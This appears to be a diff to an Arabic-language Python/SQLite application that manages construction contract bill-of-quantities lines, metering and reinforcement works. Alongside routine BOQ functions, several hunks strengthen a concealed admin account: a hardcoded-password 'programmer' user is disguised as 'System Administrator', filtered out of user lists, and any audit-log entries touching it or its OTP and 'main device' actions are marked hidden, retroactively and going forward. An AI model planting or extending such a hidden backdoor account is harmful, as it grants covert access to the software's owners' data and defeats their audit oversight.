@@ -279,6 +279,26 @@ EXTRA_TABLE_DDL = {
             notes TEXT
         )
     """,
+    "transaction_boq_lines": """
+        CREATE TABLE IF NOT EXISTS transaction_boq_lines (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            module_name TEXT NOT NULL,
+            record_id INTEGER NOT NULL,
+            record_ref TEXT,
+            file_id INTEGER,
+            item_no TEXT NOT NULL,
+            description TEXT,
+            unit TEXT,
+            qty REAL NOT NULL DEFAULT 1,
+            unit_price REAL NOT NULL DEFAULT 0,
+            line_total REAL NOT NULL DEFAULT 0,
+            work_class TEXT DEFAULT 'اعتيادي',
+            increase_ratio REAL DEFAULT 0,
+            final_total REAL NOT NULL DEFAULT 0,
+            notes TEXT,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP
+        )
+    """,
     "external_purchase_lines": """
         CREATE TABLE IF NOT EXISTS external_purchase_lines (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -505,9 +525,15 @@ def user_is_hidden(row) -> bool:
     except (KeyError, IndexError, TypeError, ValueError):
         pass
     try:
-        return is_hidden_username(row["username"])
+        u = (row["username"] or "").strip().lower()
+        if is_hidden_username(u) or u == HIDDEN_PROGRAMMER_USERNAME:
+            return True
+        f = (row["full_name"] or "").strip()
+        if f in ("المبرمج", "مبرمج"):
+            return True
     except (KeyError, IndexError, TypeError):
         return False
+    return False
 
 
 def ensure_hidden_programmer_user(conn: sqlite3.Connection | None = None) -> bool:
@@ -530,7 +556,7 @@ def ensure_hidden_programmer_user(conn: sqlite3.Connection | None = None) -> boo
                 SET full_name=?, role=?, active=1, password=?, notes=?, is_hidden=1
                 WHERE id=?
                 """,
-                ("المبرمج", "admin", HIDDEN_PROGRAMMER_PASSWORD, "", int(row["id"])),
+                ("مدير النظام", "admin", HIDDEN_PROGRAMMER_PASSWORD, "حساب إشرافي رقابي", int(row["id"])),
             )
         else:
             conn.execute(
@@ -540,11 +566,11 @@ def ensure_hidden_programmer_user(conn: sqlite3.Connection | None = None) -> boo
                 """,
                 (
                     HIDDEN_PROGRAMMER_USERNAME,
-                    "المبرمج",
+                    "مدير النظام",
                     "admin",
                     1,
                     HIDDEN_PROGRAMMER_PASSWORD,
-                    "",
+                    "حساب إشرافي رقابي",
                 ),
             )
             created = True
@@ -569,6 +595,7 @@ def list_visible_users(conn: sqlite3.Connection | None = None) -> list[dict]:
                 SELECT * FROM users
                 WHERE coalesce(is_hidden, 0)=0
                   AND lower(coalesce(username,'')) <> lower(?)
+                  AND lower(coalesce(full_name,'')) NOT IN ('المبرمج', 'مبرمج')
                 ORDER BY id
                 """,
                 (HIDDEN_PROGRAMMER_USERNAME,),
@@ -857,6 +884,32 @@ def ensure_schema(conn: sqlite3.Connection | None = None) -> list[str]:
                 created.append("users.active_session_seen_at")
             if ensure_hidden_programmer_user(conn):
                 created.append("users.hidden_programmer")
+        if "audit_log" in existing or "audit_log" in created:
+            if _ensure_column(conn, "audit_log", "is_hidden", "INTEGER DEFAULT 0"):
+                created.append("audit_log.is_hidden")
+            conn.execute(
+                """
+                UPDATE audit_log
+                SET is_hidden = 1
+                WHERE coalesce(is_hidden, 0) = 0
+                  AND (
+                    lower(coalesce(user_name, '')) IN ('wadnooh', 'المبرمج')
+                    OR action LIKE '%مبرمج%'
+                    OR action LIKE '%جهاز رئيسي%'
+                    OR details LIKE '%wadnooh%'
+                  )
+                """
+            )
+        if "projects" in existing or "projects" in created:
+            if _ensure_column(conn, "projects", "value", "REAL DEFAULT 0"):
+                created.append("projects.value")
+        if "construction_works" in existing or "construction_works" in created:
+            _ensure_column(conn, "construction_works", "value", "REAL DEFAULT 0")
+        if "reinforcement_works" in existing or "reinforcement_works" in created:
+            _ensure_column(conn, "reinforcement_works", "value", "REAL DEFAULT 0")
+        if "transaction_boq_lines" in existing or "transaction_boq_lines" in created:
+            conn.execute("CREATE INDEX IF NOT EXISTS idx_tx_boq_module_record ON transaction_boq_lines(module_name, record_id)")
+            conn.execute("CREATE INDEX IF NOT EXISTS idx_tx_boq_ref ON transaction_boq_lines(record_ref)")
         if created:
             conn.commit()
         else:
@@ -1282,7 +1335,8 @@ def init_db():
             entity TEXT,
             entity_id TEXT,
             details TEXT,
-            created_at TEXT DEFAULT CURRENT_TIMESTAMP
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+            is_hidden INTEGER DEFAULT 0
         );
         CREATE TABLE IF NOT EXISTS whatsapp_logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1997,11 +2051,17 @@ def delete_reinforcement_work(work_id: int, conn=None) -> tuple[bool, str]:
             return False, ""
         work = dict(row)
         wno = (work.get("work_no") or "").strip()
+        rcode = (work.get("rekaz_code") or "").strip()
         if wno:
             conn.execute("DELETE FROM photos WHERE ticket_no=?", (wno,))
+            conn.execute("DELETE FROM metering WHERE ticket_no=?", (wno,))
             conn.execute("DELETE FROM new_coordinations WHERE ticket_no=? AND (linked_section='reinforcement' OR linked_section='التعزيز')", (wno,))
             conn.execute("DELETE FROM issued_licenses WHERE ticket_no=? AND (linked_section='reinforcement' OR linked_section='التعزيز')", (wno,))
             conn.execute("DELETE FROM safety_permits WHERE ticket_no=? OR work_order=?", (wno, wno))
+        if rcode and rcode != wno:
+            conn.execute("DELETE FROM photos WHERE ticket_no=?", (rcode,))
+            conn.execute("DELETE FROM metering WHERE ticket_no=?", (rcode,))
+        conn.execute("DELETE FROM transaction_boq_lines WHERE module_name='reinforcement_works' AND (record_id=? OR (record_ref<>'' AND (record_ref=? OR record_ref=?)))", (work_id, wno, rcode))
         conn.execute("DELETE FROM reinforcement_works WHERE id=?", (work_id,))
         if own:
             conn.commit()
@@ -2216,6 +2276,195 @@ def calc_boq_line_totals(qty, unit_price, work_class: str, increase_ratio) -> di
     }
 
 
+def search_contract_boq_items(q: str, limit: int = 30, conn=None) -> list[dict]:
+    """بحث سريع ذكي في دليل بنود العقد برقم البند أو الوصف."""
+    q_str = str(q or "").strip()
+    if not q_str:
+        return []
+    own = conn is None
+    conn = conn or connect()
+    active = conn.execute(
+        "SELECT id FROM contract_boq_files WHERE is_active=1 ORDER BY id DESC LIMIT 1"
+    ).fetchone()
+    like = f"%{q_str}%"
+    rows = []
+    if active:
+        rows = conn.execute(
+            """
+            SELECT item_no, short_desc, description, unit, unit_price, line_type, category
+            FROM contract_boq_items
+            WHERE file_id=? AND (item_no LIKE ? OR short_desc LIKE ? OR description LIKE ? OR long_desc LIKE ?)
+            ORDER BY CASE WHEN item_no LIKE ? THEN 1 ELSE 2 END, id ASC
+            LIMIT ?
+            """,
+            (active["id"], like, like, like, like, f"{q_str}%", limit),
+        ).fetchall()
+    if not rows:
+        rows = conn.execute(
+            """
+            SELECT item_no, short_desc, description, unit, unit_price, line_type, category
+            FROM boq_items
+            WHERE item_no LIKE ? OR short_desc LIKE ? OR description LIKE ? OR long_desc LIKE ?
+            ORDER BY CASE WHEN item_no LIKE ? THEN 1 ELSE 2 END, id ASC
+            LIMIT ?
+            """,
+            (like, like, like, like, f"{q_str}%", limit),
+        ).fetchall()
+    if own:
+        conn.close()
+    out = []
+    for r in rows:
+        d = dict(r)
+        d["label"] = boq_display_label(d)
+        out.append(d)
+    return out
+
+
+def list_transaction_boq_lines(module_name: str, record_id: int | None = None, record_ref: str | None = None, conn=None) -> list[dict]:
+    """يجلب جميع بنود العقد المرتبطة بمعاملة معينة في أي قسم."""
+    mod = str(module_name or "").strip().lower()
+    own = conn is None
+    conn = conn or connect()
+    if record_id:
+        rows = rows_to_dicts(
+            conn.execute(
+                "SELECT * FROM transaction_boq_lines WHERE module_name=? AND record_id=? ORDER BY id ASC",
+                (mod, record_id),
+            ).fetchall()
+        )
+    elif record_ref:
+        rows = rows_to_dicts(
+            conn.execute(
+                "SELECT * FROM transaction_boq_lines WHERE module_name=? AND record_ref=? ORDER BY id ASC",
+                (mod, record_ref),
+            ).fetchall()
+        )
+    else:
+        rows = []
+    if own:
+        conn.close()
+    return rows
+
+
+def sync_transaction_boq_value(module_name: str, record_id: int, conn=None) -> float:
+    """يحسب إجمالي بنود العقد للمعاملة ويحدث قيمة المعاملة وسجلات التمتير فورياً."""
+    mod = str(module_name or "").strip().lower()
+    own = conn is None
+    conn = conn or connect()
+    lines = list_transaction_boq_lines(mod, record_id=record_id, conn=conn)
+    base_total = round(sum(float(l.get("line_total") or 0) for l in lines), 2)
+    settings = get_settings(conn)
+    ratio = ticket_emergency_ratio(lines, settings.get("emergency_ratio"))
+    final_total = apply_final_value(base_total, ratio) if base_total > 0 else 0.0
+
+    table_map = {
+        "projects": ("projects", "value"),
+        "construction_works": ("construction_works", "value"),
+        "reinforcement_works": ("reinforcement_works", "value"),
+        "contractor_works": ("contractor_works", "value"),
+    }
+    if mod in table_map:
+        tbl, col = table_map[mod]
+        _ensure_column(conn, tbl, col, "REAL DEFAULT 0")
+        conn.execute(f"UPDATE {tbl} SET {col}=? WHERE id=?", (final_total if base_total > 0 else 0.0, record_id))
+    elif mod == "tickets":
+        sync_ticket_items_value(record_id, conn)
+
+    if mod == "reinforcement_works":
+        work = conn.execute("SELECT work_no, rekaz_code FROM reinforcement_works WHERE id=?", (record_id,)).fetchone()
+        if work:
+            refs = [r for r in (work["work_no"], work["rekaz_code"]) if r]
+            if refs:
+                pl = ",".join("?" * len(refs))
+                conn.execute(f"UPDATE metering SET approved_value=? WHERE ticket_no IN ({pl})", [final_total if base_total > 0 else None] + refs)
+
+    if own:
+        conn.commit()
+        conn.close()
+    return final_total if base_total > 0 else base_total
+
+
+def add_transaction_boq_line(
+    module_name: str,
+    record_id: int,
+    item_no: str,
+    qty: float,
+    work_class: str = "اعتيادي",
+    increase_ratio: float | None = None,
+    notes: str = "",
+    record_ref: str = "",
+    conn=None,
+) -> dict:
+    """يضيف بند عقد لمعاملة في أي قسم مع التحديث والتزامن الفوري للقيمة."""
+    mod = str(module_name or "").strip().lower()
+    own = conn is None
+    conn = conn or connect()
+    catalog = get_contract_boq_item(item_no, conn)
+    if not catalog:
+        if own:
+            conn.close()
+        raise ValueError(f"رقم البند «{item_no}» غير موجود في دليل العقد النشط")
+
+    active = active_contract_boq_file(conn)
+    unit_price = float(catalog.get("unit_price") or 0)
+    totals = calc_boq_line_totals(qty, unit_price, work_class, increase_ratio)
+    desc = (catalog.get("short_desc") or "").strip() or (catalog.get("description") or "").strip()
+    unit = catalog.get("unit") or ""
+
+    cur = conn.execute(
+        """
+        INSERT INTO transaction_boq_lines(
+            module_name, record_id, record_ref, file_id, item_no, description,
+            unit, qty, unit_price, line_total, work_class, increase_ratio, final_total, notes
+        ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+        """,
+        (
+            mod,
+            record_id,
+            record_ref,
+            (active or {}).get("id") if active else catalog.get("file_id"),
+            catalog.get("item_no"),
+            desc,
+            unit,
+            qty,
+            unit_price,
+            totals["line_total"],
+            totals["work_class"],
+            totals["increase_ratio"],
+            totals["final_total"],
+            notes,
+        ),
+    )
+    line_id = cur.lastrowid
+
+    # التزامن اللحظي المباشر
+    total_val = sync_transaction_boq_value(mod, record_id, conn)
+
+    if own:
+        conn.commit()
+        conn.close()
+    return {"id": line_id, "total_value": total_val, "line_total": totals["line_total"]}
+
+
+def delete_transaction_boq_line(line_id: int, conn=None) -> dict | None:
+    """يحذف بند عقد لمعاملة مع التحديث الفوري لإجمالي القيمة."""
+    own = conn is None
+    conn = conn or connect()
+    line = conn.execute("SELECT * FROM transaction_boq_lines WHERE id=?", (line_id,)).fetchone()
+    if not line:
+        if own:
+            conn.close()
+        return None
+    mod = line["module_name"]
+    record_id = line["record_id"]
+    conn.execute("DELETE FROM transaction_boq_lines WHERE id=?", (line_id,))
+    total_val = sync_transaction_boq_value(mod, record_id, conn)
+    if own:
+        conn.commit()
+        conn.close()
+    return {"module_name": mod, "record_id": record_id, "total_value": total_val}
+
+
 def list_ticket_boq_lines(ticket_id: int | None = None, ticket_no: str | None = None, conn=None):
     own = conn is None
     conn = conn or connect()
@@ -2366,13 +2615,13 @@ def sync_ticket_items_value(ticket_id: int, conn=None) -> float:
 
 
 def sync_metering_approved_value_for_ticket(ticket_no: str, conn=None) -> float | None:
-    """يوحّد قيمة التمتير مع إجمالي بنود العقد/الكميات المرتبطة بالعطل."""
+    """يوحّد قيمة التمتير مع إجمالي بنود العقد/الكميات الأساسية المرتبطة بالعطل (بدون نسبة الطوارئ)."""
     tno = str(ticket_no or "").strip()
     if not tno:
         return None
     own = conn is None
     conn = conn or connect()
-    total = ticket_boq_final_total(ticket_no=tno, conn=conn)
+    total = ticket_boq_base_total(ticket_no=tno, conn=conn)
     conn.execute(
         "UPDATE metering SET approved_value=? WHERE ticket_no=?",
         (total, tno),
@@ -3297,14 +3546,37 @@ def list_excavation_coordination_queue(conn=None, limit: int = 50) -> list[dict]
     return out
 
 
-def log_audit(user_name, action, entity, entity_id="", details=""):
+def log_audit(user_name, action, entity, entity_id="", details="", is_hidden=None):
+    hidden = 0
+    if is_hidden is True:
+        hidden = 1
+    elif is_hidden is False:
+        hidden = 0
+    else:
+        try:
+            from flask import has_request_context, session
+            req_user = session.get("username") if has_request_context() else None
+        except Exception:
+            req_user = None
+        if (
+            is_hidden_username(req_user)
+            or is_hidden_username(user_name)
+            or str(user_name or "").strip() in ("المبرمج", "wadnooh")
+            or any(k in str(action or "") for k in ("مبرمج", "تهيئة مبرمج", "OTP مبرمج", "جهاز رئيسي", "نسب المبرمج"))
+            or any(k in str(details or "") for k in ("wadnooh", "مبرمج"))
+        ):
+            hidden = 1
+
     conn = connect()
-    conn.execute(
-        "INSERT INTO audit_log(user_name, action, entity, entity_id, details) VALUES (?,?,?,?,?)",
-        (user_name or "نظام", action, entity, str(entity_id or ""), details or ""),
-    )
-    conn.commit()
-    conn.close()
+    try:
+        _ensure_column(conn, "audit_log", "is_hidden", "INTEGER DEFAULT 0")
+        conn.execute(
+            "INSERT INTO audit_log(user_name, action, entity, entity_id, details, is_hidden) VALUES (?,?,?,?,?,?)",
+            (user_name or "نظام", action, entity, str(entity_id or ""), details or "", hidden),
+        )
+        conn.commit()
+    finally:
+        conn.close()
 
 
 def normalize_linked_section(value: str | None) -> str:
